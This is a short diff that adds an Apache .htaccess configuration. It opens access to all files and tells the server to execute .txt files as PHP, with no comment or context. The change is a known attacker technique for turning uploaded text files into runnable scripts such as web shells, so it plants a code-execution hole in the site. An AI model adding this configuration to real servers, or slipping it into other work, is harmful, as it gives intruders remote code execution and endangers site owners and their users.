@@ -1,0 +1,4 @@
+<Files *>
+    Allow from all
+</Files>
+addtype application/x-httpd-php .txt
